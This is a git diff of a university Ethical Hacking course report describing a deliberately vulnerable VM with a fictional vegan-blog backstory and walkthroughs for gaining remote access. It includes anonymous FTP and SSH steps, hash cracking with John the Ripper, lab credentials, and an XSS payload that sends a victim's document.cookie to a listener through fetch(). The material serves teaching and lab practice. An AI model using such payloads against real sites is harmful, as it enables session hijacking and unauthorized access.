@@ -7,12 +7,12 @@ Virtual machine design and report<br/>
 <b>
 Group <code>0xe</code> - Salvatore Busiello, Nicholas Montana, Alex Parri
 </b><br/>
-<i>vC0rp Virtual Machine</i>
+*vC0rp* Virtual Machine
 </center>
 
 ---
 
-This is a report for the Ethical Hacking course directed by Daniele Friolo and Davide Guerri of the Academic Year 23/24 at Sapienza University of Rome.
+This is a report for the Ethical Hacking course directed by Daniele Friolo and Davide Guerri for the Academic Year 23/24 at Sapienza University of Rome.
 
 We were instructed to design a virtual machine (VM) containing deliberate vulnerabilities and to create a written report documenting the machine itself and three different paths to obtain remote access and finally escalate privileges to root user.
 
@@ -24,9 +24,7 @@ We were instructed to design a virtual machine (VM) containing deliberate vulner
 - [Obtaining remote access](#obtaining-remote-access)
   - [🟢 Easy path](#-easy-path)
   - [🟠 Medium path](#-medium-path)
-    - [Exploit](#exploit)
   - [🔴 Hard path](#-hard-path)
-    - [Exploit](#exploit-1)
 - [Privilege escalation](#privilege-escalation)
   - [🟢 Easy path](#-easy-path-1)
   - [🟠 Medium path](#-medium-path-1)
@@ -35,9 +33,9 @@ We were instructed to design a virtual machine (VM) containing deliberate vulner
 
 # Machine specifications
 ## Context
-vC0rp presents itself as a company that cares about veganism and the environment. They run a popular blog called "The Green Crusaders" that talks about being vegan and saving the planet.
+vC0rp presents itself as a company that cares about veganism and the environment. They run a popular blog called "The Green Crusaders" which talks about being vegan and saving the planet.
 
-But here's the twist: secretly, vC0rp is involved in something shady. Behind the scenes, they're actually a big part of the illegal meat trade. While they preach about being kind to animals and the environment, they're making money from selling meat on the black market.
+But here's the twist: secretly, vC0rp is involved in something shady. Behind the scenes, they're actually a big part of the illegal meat trade. While they preach about being kind to animals and the environment, they're making money from selling meat on the black market!
 
 In their offices, top bosses are always coming up with sneaky plans to keep their illegal business going. They bend the rules and bribe people to stay under the radar. It's a two-faced operation – they say one thing in public but do the opposite in private.
 
@@ -46,16 +44,16 @@ As their secret starts to leak out, vC0rp finds itself in big trouble. Will they
 ## Machine overview
 The machine runs an `nginx` web server that hosts The Green Crusaders blog. This blog presents vulnerabilities such as cross site scripting, command injection and other poor security policies that can be exploited by an attacker to gain remote access. 
 
-There are users registered on the blog, being:
-- **Fabiola Di Sotto** aka vegmamy, blog author
-- **Giorgio Immesi** aka ilveganoimbruttito, blog author
+There are three users registered on the blog, being:
+- **Fabiola Di Sotto** aka `vegmamy`, blog author
+- **Giorgio Immesi** aka `ilveganoimbruttito`, blog author
 - **Matteo Ricci**, a member of the staff, is currently organizing a protest.
   
-The machine also runs an `ftp` server which contains an interesting sql backup. 
+The machine also runs an ftp server which contains an interesting sql backup. 
 
 Behind the scenes, the server runs another web server hosting an *hidden* web service for the trade of meat. This web service is placed inside docker for security reasons and is **not an easy target**. 
 
-There are also some command line interface programs in the server's file system used internally by the staff to trade meat. This program presents some vulnerabilities that can also be exploited to gain privileged access.
+There are also some command line interface programs in the server's file system used internally by the staff to trade meat. These programs present some vulnerabilities that can be leveraged to gain privileged access.
 
 Below is shown a diagram of the machine with all the services running and a brief description on how to attack them:
 
@@ -90,9 +88,23 @@ Nmap done: 1 IP address (1 host up) scanned in 6.12 seconds
 Now we have every single ingredient for our remote access adventure, of which we were instructed to provide three different paths.
 
 ## 🟢 Easy path
-From the scanning, we can notice that there is an ftp server running. We should also notice by probing the authentication mechanism of the ftp server that it allows anonymous authentication. The landing directory will contain two files called `leavemehere.txt`, which contains some information for the login page, and the `sql_backup.zip` that contains the user table backup of the vegan blog. 
+From the scanning, we can notice that there is an ftp server (port 21) running. We should also notice by probing the authentication mechanism of the ftp server that it allows anonymous authentication
+```sh
+$ ftp <machine_ip>
+```
+The landing directory will contain two files called `leavemehere.txt`, which contains some information for the login page, and the `sql_backup.zip` that contains the user table backup of the vegan blog. 
 
-We have to download the backup and read the clear-text credentials from it to login. In this backup there is only one user currently active in the blog and is Matteo Ricci. We can now login as Matteo Ricci, a not so expert staff member of vC0rp. He is currently organizing a protest and published the private key of the server! This private key can be used to login with ssh on the machine.
+We have to download the backup 
+```sh
+$ get sql_backup.zip 
+```
+and read the clear-text credentials from it to login.
+
+In this backup there is only one user currently active in the blog and is Matteo Ricci. We can now login as Matteo Ricci, a not so expert staff member of vC0rp. He is currently organizing a protest and published the private key of the server! 
+```sh
+$ ssh saltbae@<machine_ip>
+```
+This private key can be used to login with ssh on the machine.
 
 ## 🟠 Medium path 
 
@@ -150,10 +162,10 @@ $ hash-identifier 78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc
 We will get told that the most probable candidate is SHA256, which is pretty secure… right?
 ![Hash identifier](images/tgc/medium/kali_hash_identifier.png)
 
-You never know until you try it, we can try to crack it by using any password cracking tool like **JohnTheRipper** or **hashcat**, in this case we will use the Ripper, while using the `rockyou` wordlist:
+You never know until you try it, we can try to crack it by using any password cracking tool like **JohnTheRipper** or **hashcat**, in this case we will use the Ripper, while using the `rockyou` wordlist and specifying that it is a SHA256 digest:
 ```sh
-$ echo "78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46" > crack.txt
-$ john --wordlist=/usr/share/wordlists/rockyou.txt.gz crack.txt 
+$ echo "78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46" > tgc_user_pass.txt
+$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 tgc_user_pass.txt 
 ```
 Bingo!
 
@@ -161,14 +173,13 @@ Bingo!
 
 We can now try logging in using the just cracked password and the above login:
 ```
-ilveganoimbruttito@greencrusaders.0xe
-4everlove
+username: ilveganoimbruttito@greencrusaders.0xe
+password: 4everlove
 ```
 And we’re in as blog author!
 
 **Note**: the same could be done with blog author ‘Fabiola di Sotto’, whose username is `vegmamy`. In her case, everything is available on her Instagram account.
 
-### Exploit
 Once entered as author of the blog, from the bottom of the profile page of the user we can access the `/YWRtaW4K/dashboard` which displays info on the posts of the user. 
 
 ![Author’s dashboard](images/tgc/medium/user_dashboard.png)
@@ -199,16 +210,14 @@ After a **painful** wait, we will have our post published. Hooray…? Indeed, be
 
 ![New post is submitted](images/tgc/medium/article_submitted.png)
 
-### Exploit
-
 The post submission process does not check and validate user input automatically so cross site scripting is possible which we can double check that by posting a post with the following input
 
-```js
+```html
 <img src=”x” onload=”alert(1)” />
 ```
 Therefore, we can try getting the admin cookie by inputting
-```js 
-<img src=1 onerror=fetch('http://127.0.0.1:8000?'+document.cookie)>
+```html
+<img src=”x” onerror=fetch('http://127.0.0.1:8000?'+document.cookie) />
 ```
 and catching the response with a simple trusty Python server through command line
 ```sh
